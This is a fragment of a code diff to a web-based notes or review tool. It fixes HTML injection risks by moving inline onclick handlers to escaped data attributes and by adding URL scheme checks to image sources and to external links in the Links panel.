-      return `<${tag} class="${cls}">${items.map(it => `<li>${renderInline(it.content)}</li>`).join('')}</${tag}>`;
+      return renderListLevel(root, true);
     }
 
     case 'image': {
-      const src = attachmentSrcFor(block.name);
-      const srcAttr = src ? ` src="${src}"` : '';
+      // block.name arrives RAW from parseBlocks (unlike the inline image
+      // path, where renderInline has already escaped it), so this branch
+      // does its own escaping and scheme check.
+      const src = safeUrl(attachmentSrcFor(block.name), { image: true });
+      const srcAttr = src ? ` src="${escHtml(src)}"` : '';
       const widthAttr = /^\d+$/.test(block.size || '') ? ` width="${block.size}"` : '';
       return `<div class="md-img-wrap"><img class="md-img" data-wb-asset="${escHtml(block.name)}"${srcAttr} alt="${escHtml(block.name)}"${widthAttr} onerror="wbImgError(this)"></div>`;
     }
@@ -4199,7 +4610,7 @@ function buildChangesHTML() {
   state.reviewChanges.forEach((r, ri) => {
     html += `<div class="rv-file">
       <div class="rv-file-head">
-        <span class="rv-file-name" onclick="openFile('${r.url}','${r.name.replace(/'/g, "\\'")}')">${escHtml(r.name)}</span>
+        <span class="rv-file-name" data-wb-open="${escHtml(r.url)}" data-wb-name="${escHtml(r.name)}">${escHtml(r.name)}</span>
         <button class="rv-mark-btn" onclick="markReviewed(${ri})">Accept all</button>
       </div>`;
     const head = headOpenIdx(r.entries);
@@ -4228,7 +4639,7 @@ function buildChangesHTML() {
     state.unauditedFiles.forEach((f, fi) => {
       html += `<div class="rv-file">
         <div class="rv-file-head">
-          <span class="rv-file-name" onclick="openFile('${escHtml(f.url)}','${f.name.replace(/'/g, "\\'")}')">${escHtml(f.name)}</span>
+          <span class="rv-file-name" data-wb-open="${escHtml(f.url)}" data-wb-name="${escHtml(f.name)}">${escHtml(f.name)}</span>
           <button class="rv-mark-btn" onclick="approveNewFile(${fi})">Update</button>
         </div>
       </div>`;
@@ -4333,7 +4744,7 @@ function renderReviewOverview() {
       const head = headOpenIdx(r.entries);
       const openCount = r.entries.filter(e => e.reviewed === 'no').length;
       html += `<div class="backlink-item">
-        <span class="rv-ov-name" onclick="openFile('${escHtml(r.url)}','${r.name.replace(/'/g, "\\'")}')">${escHtml(r.name)}</span>
+        <span class="rv-ov-name" data-wb-open="${escHtml(r.url)}" data-wb-name="${escHtml(r.name)}">${escHtml(r.name)}</span>
         <span class="rv-ov-count" title="${openCount} pending change${openCount > 1 ? 's' : ''}">${openCount}</span>
         <button class="rv-ov-btn rv-ov-accept" title="Accept" onclick="event.stopPropagation();inboxEntryActionOverview(${ri},${head},'yes')">✓</button>
         <button class="rv-ov-btn rv-ov-reject" title="Reject" onclick="event.stopPropagation();inboxEntryActionOverview(${ri},${head},'rejected')">✕</button>
@@ -4347,7 +4758,7 @@ function renderReviewOverview() {
   } else {
     state.unauditedFiles.forEach((f, fi) => {
       html += `<div class="backlink-item">
-        <span class="rv-ov-name" onclick="openFile('${escHtml(f.url)}','${f.name.replace(/'/g, "\\'")}')">${escHtml(f.name)}</span>
+        <span class="rv-ov-name" data-wb-open="${escHtml(f.url)}" data-wb-name="${escHtml(f.name)}">${escHtml(f.name)}</span>
         <button class="rv-ov-btn" onclick="event.stopPropagation();approveNewFileFromOverview(${fi})">Update</button>
       </div>`;
     });
@@ -5301,10 +5712,15 @@ function renderOutlineTab() {
     if (isFolded) hideLevel = m.level;
 
     const chevron = m.hasChildren
-      ? `<button class="rp-outline-fold-btn${isFolded ? ' folded' : ''}" data-hid="${escHtml(m.id)}" title="${isFolded ? 'Expand' : 'Collapse'}" aria-label="${isFolded ? 'Expand' : 'Collapse'}" onclick="event.stopPropagation();toggleOutlineHeading('${escHtml(m.id)}')">${ICON.foldChevron}</button>`
+      ? `<button class="rp-outline-fold-btn${isFolded ? ' folded' : ''}" data-hid="${escHtml(m.id)}" data-wb-outfold="${escHtml(m.id)}" title="${isFolded ? 'Expand' : 'Collapse'}" aria-label="${isFolded ? 'Expand' : 'Collapse'}">${ICON.foldChevron}</button>`
       : `<span class="rp-outline-fold-spacer"></span>`;
 
-    html += `<div class="rp-outline-row rp-outline-h${m.level}">${chevron}<button class="rp-outline-item" data-hid="${escHtml(m.id)}" onclick="scrollToHeading('${escHtml(m.id)}')">${escHtml(m.text)}</button></div>`;
+    // m.id comes from headingId(), which strips everything outside [\w\s-],
+    // so it can never contain a quote — these two were not exploitable. They
+    // move to data-attributes anyway so that no dynamic value anywhere is
+    // interpolated into executable attribute text, which is the property
+    // that has to hold for dropping 'unsafe-inline' from the CSP later.
+    html += `<div class="rp-outline-row rp-outline-h${m.level}">${chevron}<button class="rp-outline-item" data-hid="${escHtml(m.id)}" data-wb-outjump="${escHtml(m.id)}">${escHtml(m.text)}</button></div>`;
     visibleEls.push(m.el);
   });
 
@@ -5458,8 +5874,16 @@ function extractLinksForDisplay(rawMd) {
 function renderLinkGroup(label, items, kind) {
   if (!items.length) return '';
   const rows = items.map(item => {
-    if (kind === 'md')  return `<div class="backlink-item" onclick="openFile('${escHtml(item.url)}','${escHtml(item.name)}')">${ICON.file} ${escHtml(item.name)}</div>`;
-    if (kind === 'web') return `<div class="backlink-item" onclick="window.open('${escHtml(item.href)}','_blank','noopener')">↗ ${escHtml(item.name)}</div>`;
+    if (kind === 'md')  return `<div class="backlink-item" data-wb-open="${escHtml(item.url)}" data-wb-name="${escHtml(item.name)}">${ICON.file} ${escHtml(item.name)}</div>`;
+    if (kind === 'web') {
+      // The Links panel lists every URL found in the note, so it needs the
+      // same scheme allowlist the rendered link got — otherwise a blocked
+      // javascript: link is neutralised in the body but still clickable
+      // here, which would defeat the fix entirely.
+      const clean = safeUrl(item.href);
+      if (!clean) return `<div class="backlink-item" style="cursor:default;color:var(--text-muted)" title="Link removed — unsupported or unsafe URL scheme">↗ ${escHtml(item.name)}</div>`;
+      return `<div class="backlink-item" data-wb-external="${escHtml(clean)}">↗ ${escHtml(item.name)}</div>`;
+    }
     if (kind === 'folder') return `<div class="backlink-item" style="cursor:default">${ICON.folder} ${escHtml(item.name)}</div>`;
     return `<div class="backlink-item" style="cursor:default;color:var(--text-muted)">${escHtml(item.name)}</div>`;
   }).join('');
@@ -5493,7 +5917,7 @@ function renderBacklinksTab() {
   html += '<div class="rv-ov-label">Backlinks</div>';
   if (backlinks.length) {
     html += backlinks.map(l =>
-      `<div class="backlink-item" onclick="openFile('${escHtml(l.url)}','${escHtml(l.name)}')">${ICON.file} ${escHtml(l.name)}</div>`
+      `<div class="backlink-item" data-wb-open="${escHtml(l.url)}" data-wb-name="${escHtml(l.name)}">${ICON.file} ${escHtml(l.name)}</div>`
     ).join('');
   } else {
     html += '<div class="rp-empty" style="padding:4px 12px 12px;text-align:left">No backlinks found this session.</div>';
@@ -5931,14 +6355,14 @@ function buildReviewHTML(data, filter) {
   } else {
     filtered.forEach(file => {
       html += `<div class="review-file-block">
-        <div class="review-file-header" onclick="openFile('${escHtml(file.url)}','${escHtml(file.name)}')">${ICON.file} ${escHtml(file.name)}</div>
+        <div class="review-file-header" data-wb-open="${escHtml(file.url)}" data-wb-name="${escHtml(file.name)}">${ICON.file} ${escHtml(file.name)}</div>
         <div class="comment-list">`;
 
       file.comments.forEach((c, i) => {
         const icon  = ICONS_TYPE[c.type] || '·';
         const date  = c.ts.replace('T', ' ').slice(0, 16);
         const closeBtn = c.status === 'open'
-          ? `<button class="review-open-btn" onclick="closeCommentInReview('${escHtml(file.commentsUrl)}','${escHtml(file.name)}',${i})">Mark closed</button>`
+          ? `<button class="review-open-btn" data-wb-closecmt="${escHtml(file.commentsUrl)}" data-wb-name="${escHtml(file.name)}" data-wb-idx="${i}">Mark closed</button>`
           : '';
 
         html += `<div class="comment-card type-${escHtml(c.type)} status-${escHtml(c.status)}">
@@ -5948,7 +6372,7 @@ function buildReviewHTML(data, filter) {
           </div>
           <div class="comment-body">${escHtml(c.body)}</div>
           <div class="review-action-row">
-            <button class="review-open-btn" onclick="openFile('${escHtml(file.url)}','${escHtml(file.name)}')">Open file →</button>
+            <button class="review-open-btn" data-wb-open="${escHtml(file.url)}" data-wb-name="${escHtml(file.name)}">Open file →</button>
             ${closeBtn}
           </div>
         </div>`;
